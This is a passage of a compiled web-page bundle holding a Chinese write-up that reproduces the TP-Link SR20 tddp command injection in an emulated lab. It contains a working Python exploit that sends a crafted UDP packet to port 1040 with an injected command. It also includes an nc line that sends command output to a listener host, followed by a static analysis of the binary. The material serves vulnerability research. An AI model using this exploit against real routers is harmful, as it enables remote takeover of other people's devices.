10.10.10.2/24",-1),bs=s("p",null,"使用chroot切换根目录固件文件系统",-1),vs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"mount "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"o bind "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"dev "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"H4lo"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"dev"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"mount "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"t proc "),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"proc"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"H4lo"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"proc"),s("span",{style:{color:"#89DDFF"}},"/")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"chroot H4lo"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"TP"),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"Link_SR20 sh")])])])],-1),Es=s("p",null,"在宿主机查看atftpd 状态",-1),Ts=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"sudo systemctl status atftpd")])])])],-1),Ps=s("p",null,"2、qemu虚拟机中启动tddp程序",-1),Ss=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"./"),s("span",{style:{color:"#A6ACCD"}},"usr"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#82AAFF"}},"bin"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"tddp")])])])],-1),Bs=s("p",null,"3、虚拟机nmap扫描",-1),ws=s("p",null,"最开始扫描不出来，后来发现，我上面的ip设置的是10.10.10.2，扫描的时候写的ip是10.0.0.2......",-1),Rs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"nmap "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"p "),s("span",{style:{color:"#F78C6C"}},"1040"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"-"),s("span",{style:{color:"#A6ACCD"}},"sU "),s("span",{style:{color:"#F78C6C"}},"10.10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"10"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"2")])])])],-1),xs=s("p",null,[s("img",{src:g,alt:"fig11-nmap"})],-1),qs=s("p",null,"4、运行exp",-1),$s=s("p",null,[l("虚拟机运行："),s("code",null,"python exp.py 10.10.10.2 date")],-1),Ls=s("p",null,"出现如下错误",-1),js=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"root"),s("span",{style:{color:"#89DDFF"}},"@"),s("span",{style:{color:"#A6ACCD"}},"ubuntu"),s("span",{style:{color:"#89DDFF"}},":/"),s("span",{style:{color:"#A6ACCD"}},"home"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"giantbranch"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"CVE"),s("span",{style:{color:"#89DDFF"}},"/"),s("span",{style:{color:"#A6ACCD"}},"TPlinkSR20"),s("span",{style:{color:"#676E95","font-style":"italic"}},"# python exp.py 10.10.10.2 date")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"Traceback "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"most recent call last"),s("span",{style:{color:"#89DDFF"}},"):")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  File "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"exp.py"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," line "),s("span",{style:{color:"#F78C6C"}},"15"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"in"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"<"),s("span",{style:{color:"#A6ACCD"}},"module"),s("span",{style:{color:"#89DDFF"}},">")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"    payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"x01x31"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"ljust"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"12"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#C3E88D"}},"x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#FFCB6B"}},"TypeError"),s("span",{style:{color:"#89DDFF"}},":"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"ljust"),s("span",{style:{color:"#89DDFF"}},"()"),s("span",{style:{color:"#A6ACCD"}}," argument "),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#A6ACCD"}}," must be char"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"not"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#FFCB6B"}},"str")])])])],-1),Is=s("p",null,"这是因为别的大佬在发布文章的时候，反斜杠 \\ 这个字符被网页过滤了，再加上就好。payload如下：",-1),Ms=s("p",null,[s("img",{src:f,alt:"fig12-payload"})],-1),Ns=s("p",null,"命令成功执行结果如下：",-1),Hs=s("p",null,[s("img",{src:k,alt:"fig13-res_date"})],-1),zs=s("p",null,"5、NC回显结果",-1),Os=s("p",null,[l("宿主机监听7890端口："),s("code",null,"nc -nvl 10.10.10.1 7890")],-1),Us=s("p",null,[l("qemu打开tddp："),s("code",null,"./usr/bin/tddp")],-1),Vs=s("p",null,[l("宿主机执行exp："),s("code",null,'python exp.py 10.10.10.2 "ifconfig|nc 10.10.10.1 7890"')],-1),Js=s("p",null,[l("结果如下"),s("img",{src:b,alt:"fig14-res-nc"})],-1),Gs=s("p",null,"右下角输出的是命令ifconfig的内容。",-1),Ks=s("p",null,"poc如下",-1),Qs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"from"),s("span",{style:{color:"#A6ACCD"}}," pwn "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"import"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"from"),s("span",{style:{color:"#A6ACCD"}}," socket "),s("span",{style:{color:"#89DDFF","font-style":"italic"}},"import"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"*")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF","font-style":"italic"}},"import"),s("span",{style:{color:"#A6ACCD"}}," sys")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"tddp_port "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"1040")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"recv_port "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#F78C6C"}},"12345")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"ip "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," sys"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"argv"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"command "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," sys"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#F07178"}},"argv"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},"]")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"s_send "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"socket"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"AF_INET"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"SOCK_DGRAM"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"s_recv "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"socket"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"AF_INET"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"SOCK_DGRAM"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"s_recv"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"bind"),s("span",{style:{color:"#89DDFF"}},"(("),s("span",{style:{color:"#89DDFF"}},"''"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#F78C6C"}},"12345"),s("span",{style:{color:"#89DDFF"}},"))")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\x01\\x31"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"ljust"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"12"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#A6ACCD"}},"\\x00"),s("span",{style:{color:"#89DDFF"}},"'"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"	"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#01表示版本号，31是用来触发漏洞的，12是用来填充的，需要后面填充12个字符。")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"payload "),s("span",{style:{color:"#89DDFF"}},"+="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"123|"),s("span",{style:{color:"#F78C6C"}},"%s"),s("span",{style:{color:"#C3E88D"}},"&&echo ;123"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"%("),s("span",{style:{color:"#A6ACCD"}},"command"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#；是用来分割的，后面的123是为了让分割之后后半部分不为空，可以看成是填充的。")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"s_send"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"sendto"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"payload"),s("span",{style:{color:"#89DDFF"}},",("),s("span",{style:{color:"#82AAFF"}},"ip"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}},"tddp_port"),s("span",{style:{color:"#89DDFF"}},"))")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"s_send"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"close"),s("span",{style:{color:"#89DDFF"}},"()")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"res"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}},"addr "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," s_recv"),s("span",{style:{color:"#89DDFF"}},"."),s("span",{style:{color:"#82AAFF"}},"recvfrom"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"1024"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"print"),s("span",{style:{color:"#A6ACCD"}}," res")])])])],-1),Zs={id:"静态分析",tabindex:"-1"},Xs=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"v14 "),s("span",{style:{color:"#89DDFF"}},"="),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#82AAFF"}},"recvfrom"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"a1"),s("span",{style:{color:"#89DDFF"}},"["),s("span",{style:{color:"#F78C6C"}},"9"),s("span",{style:{color:"#89DDFF"}},"],"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#82AAFF"}},"char "),s("span",{style:{color:"#89DDFF"}},"*)"),s("span",{style:{color:"#82AAFF"}},"a1 "),s("span",{style:{color:"#89DDFF"}},"+"),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#F78C6C"}},"45083"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," 0xAFC8u"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},"&"),s("span",{style:{color:"#82AAFF"}},"addr"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#89DDFF"}},"&"),s("span",{style:{color:"#82AAFF"}},"addr_len"),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},";")])])])],-1),Ws=s("p",null,"下面还有判断协议版本的",-1),Ys=s("p",null,[s("img",{src:v,alt:"fig4"})],-1),sl=s("p",null,"sub_936c调用了sub_16418，查看sub_936c内容如下，根据其输出内容以及setsockopt函数，判断其为主函数。",-1),ll=s("p",null,[s("img",{src:E,alt:"fig5"})],-1),ol=s("p",null,"刚才的sub_16418函数的recvfrom下面调用了sub_15E74函数。它会对传入的多个值进行比较，根据前置知识，知道了漏洞出现在case 0x31的位置。",-1),nl=s("p",null,[s("img",{src:T,alt:"fig6-0x31"})],-1),el=s("p",null,"跟随其进入sub_A580处。",-1),tl=s("p",null,[s("img",{src:P,alt:"fig7-scanf"})],-1),al=s("p",null,[l("随后有语句"),s("code",null,"v16 = inet_ntoa(*(struct in_addr *)(a1 + 4));"),l("将传入的内容变成IP地址的格式，")],-1),cl=s("p",null,"随后调用sub_91DC函数。这里的cd /tmp很可疑，可能会存在指令注入。",-1),pl=s("p",null,[s("img",{src:S,alt:"fig8-cmd"})],-1),rl=s("p",null,[l("漏洞就是在这个tftp位置处。"),s("code",null,"如果我们在我们的攻击机上配置一个atftp服务，并且向TP-Link SR20的1040端口传输一个第二个字节数据为0x31的tddp数据包，那这个路由器就会从我们的攻击机上下载文件。")],-1),Dl={id:"收获",tabindex:"-1"},Fl=s("p",null,"1、socket接收的内容是我们可控的",-1),yl=s("p",null,"2、传输的时候第一个字节代表的应该是版本号，一般设定的都是1。设定为1，参数后移12位；如果设定成其他的，参数后移28位。",-1),il=s("p",null,"参考：",-1);function Cl(t,Al,dl,_l,p,hl){const n=A,r=D;return C(),i(r,{frontmatter:p.frontmatter,data:p.data},{"main-content-md":o(()=>[w,s("h2",R,[l("漏洞原理 "),e(n,{class:"header-anchor",href:"#漏洞原理","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),s("p",null,[l("参考 "),e(n,{href:"https://paper.seebug.org/879/#_5",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://paper.seebug.org/879/#_5")]),_:1})]),s("h2",x,[l("环境搭建 "),e(n,{class:"header-anchor",href:"#环境搭建","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),q,$,L,j,I,s("h2",M,[l("固件 "),e(n,{class:"header-anchor",href:"#固件","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),s("p",null,[l("官网下载 "),e(n,{href:"https://www.tp-link.com/us/support/download/sr20/#Firmware",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://www.tp-link.com/us/support/download/sr20/#Firmware")]),_:1})]),N,H,z,O,s("h2",U,[l("复现步骤 "),e(n,{class:"header-anchor",href:"#复现步骤","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),V,J,G,K,Q,Z,X,W,Y,ss,ls,os,ns,es,ts,as,cs,ps,rs,Ds,Fs,ys,is,Cs,As,ds,_s,hs,us,ms,gs,fs,ks,bs,vs,Es,Ts,Ps,Ss,Bs,ws,Rs,xs,qs,$s,Ls,js,Is,Ms,Ns,Hs,zs,Os,Us,Vs,Js,Gs,Ks,Qs,s("h2",Zs,[l("静态分析 "),e(n,{class:"header-anchor",href:"#静态分析","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),s("p",null,[l("32位打开tddp文件，参考"),e(n,{href:"https://blog.csdn.net/weixin_43815930/article/details/107601747%EF%BC%8C%E5%85%88%E4%BB%8Erecvfrom%E5%87%BD%E6%95%B0%E5%BC%80%E5%A7%8B%E3%80%82%E5%8F%91%E7%8E%B0sub_16418%E8%B0%83%E7%94%A8%E4%BA%86%E8%BF%99%E4%B8%AA%E5%87%BD%E6%95%B0%E3%80%82%E8%B0%83%E7%94%A8%E8%AF%AD%E5%8F%A5%E5%A6%82%E4%B8%8B%EF%BC%9A",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("https://blog.csdn.net/weixin_43815930/article/details/107601747，先从recvfrom函数开始。发现sub_16418调用了这个函数。调用语句如下：")]),_:1})]),Xs,Ws,Ys,sl,ll,ol,nl,el,tl,al,cl,pl,rl,s("p",null,[e(n,{href:"https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("这篇文章")]),_:1}),l(" 先从cmd开始找起，也是可以的。")]),s("h2",Dl,[l("收获 "),e(n,{class:"header-anchor",href:"#收获","aria-hidden":"true"},{default:o(()=>[l("#")]),_:1})]),Fl,yl,il,s("p",null,[e(n,{href:"https://blog.csdn.net/weixin_43815930",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("静态分析-CSDN-byAnansi_safe")]),_:1})]),s("p",null,[e(n,{href:"https://paper.seebug.org/879/#_5",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("完整分析-seebug-by知道创宇xax007")]),_:1})]),s("p",null,[e(n,{href:"https://x1ng.top/2020/10/18/TP-Link-sr20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("完整分析-个人博客-byX1ng")]),_:1})]),s("p",null,[e(n,{href:"https://www.anquanke.com/post/id/183202",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("完整分析-安全客-byH4lo")]),_:1})]),s("p",null,[e(n,{href:"https://www.anquanke.com/post/id/84991",target:"_blank",rel:"noreferrer"},{default:o(()=>[l("一个更高层面的分析-by国外研究员")]),_:1})])]),"main-header":o(()=>[a(t.$slots,"main-header")]),"main-header-after":o(()=>[a(t.$slots,"main-header-after")]),"main-nav":o(()=>[a(t.$slots,"main-nav")]),"main-content":o(()=>[a(t.$slots,"main-content")]),"main-content-after":o(()=>[a(t.$slots,"main-content-after")]),"main-nav-before":o(()=>[a(t.$slots,"main-nav-before")]),"main-nav-after":o(()=>[a(t.$slots,"main-nav-after")]),comment:o(()=>[a(t.$slots,"comment")]),footer:o(()=>[a(t.$slots,"footer")]),aside:o(()=>[a(t.$slots,"aside")]),"aside-custom":o(()=>[a(t.$slots,"aside-custom")]),default:o(()=>[a(t.$slots,"default")]),_:3},8,["frontmatter","data"])}const vl=F(B,[["render",Cl]]);export{bl as __pageData,vl as default};
